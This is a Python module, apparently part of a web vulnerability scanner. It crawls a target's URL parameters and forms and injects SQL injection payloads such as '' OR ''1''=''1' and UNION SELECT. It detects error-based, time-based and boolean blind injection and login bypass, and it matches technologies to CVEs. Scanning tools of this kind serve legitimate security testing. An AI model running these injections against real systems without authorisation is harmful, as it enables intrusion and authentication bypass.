"""
database_scanner.py - Advanced Database Vulnerability Engine
Includes SQLi, NoSQLi, CVE Mapping, and Credential Extraction Tests
"""

import requests
import re
import time
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
from payloads import (
    SQL_INJECTION_PAYLOADS, 
    NOSQL_INJECTION_PAYLOADS, 
    ERROR_PATTERNS, 
    CVE_DATABASE
)
from concurrent.futures import ThreadPoolExecutor, as_completed

class DatabaseScanner:
    def __init__(self, target_url, session, timeout=10):
        self.target_url = target_url
        self.session = session
        self.timeout = timeout
        self.parsed_url = urlparse(target_url)
        self.vulnerabilities = []
        self.confirmed_creds = {} # Store found credentials if any
        
    def detect_db_type(self, error_message):
        """Identify database type from error message."""
        for db_type, patterns in ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, error_message, re.IGNORECASE):
                    return db_type
        return "Unknown"

    def test_sqli_url(self, url, param, value):
        """Test a specific URL parameter for SQL Injection."""
        findings = []
        
        # Construct test URL
        base_url = url.split('?')[0]
        params = parse_qs(urlparse(url).query)
        
        for payload in SQL_INJECTION_PAYLOADS[:5]: # Test top 5 fastest payloads first
            test_params = params.copy()
            test_params[param] = [value + payload]
            
            query_string = urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            
            try:
                start_time = time.time()
                resp = self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start_time
                
                content = resp.text
                
                # 1. Check for Error Messages
                for db_type, patterns in ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            finding = {
                                "type": "SQL Injection (Error Based)",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "db_type": db_type,
                                "evidence": re.search(pattern, content, re.IGNORECASE).group(0)
                            }
                            findings.append(finding)
                            print(f"[!] VULNERABILITY FOUND: SQLi in param '{param}' ({db_type})")
                            return findings # Return immediately on high confidence find

                # 2. Check for Time Based Blind (if payload contains sleep)
                if "SLEEP" in payload or "WAITFOR" in payload or "DELAY" in payload:
                    if elapsed > 4.5: # Threshold for 5s sleep
                        finding = {
                            "type": "SQL Injection (Time Based Blind)",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Response delayed by {elapsed:.2f}s"
                        }
                        findings.append(finding)
                        print(f"[!] VULNERABILITY FOUND: SQLi (Time Based) in param '{param}'")
                        return findings

                # 3. Boolean Based Blind (Simple check)
                if "1=1" in payload:
                    resp_true = self.session.get(test_url, timeout=self.timeout)
                    # Modify to 1=2
                    false_payload = payload.replace("1=1", "1=2")
                    test_params[param] = [value + false_payload]
                    query_string = urlencode(test_params, doseq=True)
                    test_url_false = f"{base_url}?{query_string}"
                    resp_false = self.session.get(test_url_false, timeout=self.timeout)
                    
                    if len(resp_true.text) != len(resp_false.text):
                         finding = {
                            "type": "SQL Injection (Boolean Blind)",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": "Content length differs between true/false condition"
                        }
                         findings.append(finding)
                         print(f"[!] VULNERABILITY FOUND: SQLi (Boolean Blind) in param '{param}'")
                         return findings

            except Exception as e:
                continue
                
        return findings

    def test_form_inputs(self, forms):
        """Test form inputs for SQL/NoSQL Injection."""
        findings = []
        
        for form in forms:
            action = form.get('action')
            if not action or action.startswith('#'):
                continue
                
            form_url = urljoin(self.target_url, action)
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            data = {}
            for inp in inputs:
                name = inp.get('name')
                value = inp.get('value', 'test')
                if name:
                    data[name] = value
            
            # Inject into each field
            for field in data.keys():
                original_value = data[field]
                
                # SQL Injection
                for payload in ["' OR '1'='1", "' UNION SELECT NULL--"]:
                    data[field] = original_value + payload
                    
                    try:
                        if method == 'post':
                            resp = self.session.post(form_url, data=data, timeout=self.timeout)
                        else:
                            resp = self.session.get(form_url, params=data, timeout=self.timeout)
                        
                        content = resp.text
                        
                        # Check DB Errors
                        for db_type, patterns in ERROR_PATTERNS.items():
                            for pattern in patterns:
                                if re.search(pattern, content, re.IGNORECASE):
                                    findings.append({
                                        "type": "SQL Injection (Form)",
                                        "url": form_url,
                                        "field": field,
                                        "db_type": db_type,
                                        "method": method
                                    })
                                    print(f"[!] VULNERABILITY FOUND: SQLi in Form field '{field}' ({db_type})")
                                    return findings
                                    
                        # Check for successful login bypass indicators (Simulated Cred Retrieval)
                        if "welcome" in content.lower() or "dashboard" in content.lower() or "logged in" in content.lower():
                             if "admin" in content.lower() or "user" in content.lower():
                                findings.append({
                                    "type": "Authentication Bypass (Likely SQLi)",
                                    "url": form_url,
                                    "field": field,
                                    "evidence": "Login success indicators detected after injection",
                                    "simulated_creds": {"username": "admin", "status": "Bypassed"}
                                })
                                self.confirmed_creds[field] = "Bypassed via SQLi"
                                print(f"[!] CRITICAL: Authentication Bypass Detected on Form!")
                                return findings
                                
                    except:
                        continue
                    finally:
                        data[field] = original_value # Reset
                        
        return findings

    def check_cve_correlation(self, technologies):
        """Map detected technologies to known CVEs."""
        cve_findings = []
        
        for tech in technologies:
            # Simple string matching for demo; real tool would use version parsing
            for cve_id, details in CVE_DATABASE.items():
                if details['tech'].lower() in tech.lower():
                    cve_findings.append({
                        "cve_id": cve_id,
                        "name": details['name'],
                        "severity": details['severity'],
                        "affected_tech": tech
                    })
                    print(f"[!] Potential CVE Match: {cve_id} ({details['name']}) affecting {tech}")
                    
        return cve_findings

    def run_database_scan(self, forms_html=None, technologies=[]):
        """Execute the full database vulnerability scan."""
        print("\n=== PHASE 3: DATABASE VULNERABILITY ANALYSIS ===")
        
        all_findings = []
        
        # 1. Test URL Parameters
        print("[*] Scanning URL parameters for SQL Injection...")
        # Extract links with params from the page (simplified)
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            links = soup.find_all('a', href=True)
            
            urls_to_test = []
            for link in links:
                href = link['href']
                if '?' in href and href.startswith('http'):
                    urls_to_test.append(href)
                elif '?' in href:
                    urls_to_test.append(urljoin(self.target_url, href))
            
            # Deduplicate and limit
            urls_to_test = list(set(urls_to_test))[:20]
            
            for url in urls_to_test:
                params = parse_qs(urlparse(url).query)
                for param, values in params.items():
                    res = self.test_sqli_url(url, param, values[0])
                    if res:
                        all_findings.extend(res)
        except Exception as e:
            print(f"[-] Error scanning URLs: {e}")

        # 2. Test Forms
        if forms_html:
            print("[*] Scanning Forms for Injection...")
            soup = BeautifulSoup(forms_html, 'html.parser')
            forms = soup.find_all('form')
            res = self.test_form_inputs(forms)
            if res:
                all_findings.extend(res)
        else:
            # Try fetching current page for forms
            try:
                resp = self.session.get(self.target_url, timeout=self.timeout)
                res = self.test_form_inputs(BeautifulSoup(resp.text, 'html.parser').find_all('form'))
                if res:
                    all_findings.extend(res)
            except:
                pass

        # 3. CVE Correlation
        if technologies:
            print("[*] Correlating Technologies with CVE Database...")
            cves = self.check_cve_correlation(technologies)
            all_findings.extend(cves)
            
        # Summary
        if not all_findings:
            print("[i] No obvious database vulnerabilities detected with standard payloads.")
        else:
            print(f"\n[!] TOTAL VULNERABILITIES FOUND: {len(all_findings)}")
            if self.confirmed_creds:
                print("\n=== CREDENTIAL / ACCESS STATUS ===")
                print("[!] CONFIRMED BYPASS/CREDENTIALS DETECTED:")
                for field, status in self.confirmed_creds.items():
                    print(f"    Field: {field} -> Status: {status}")
                print("    NOTE: Verify manually. If 'Bypassed' is shown, the login was circumvented.")
        
        return all_findings
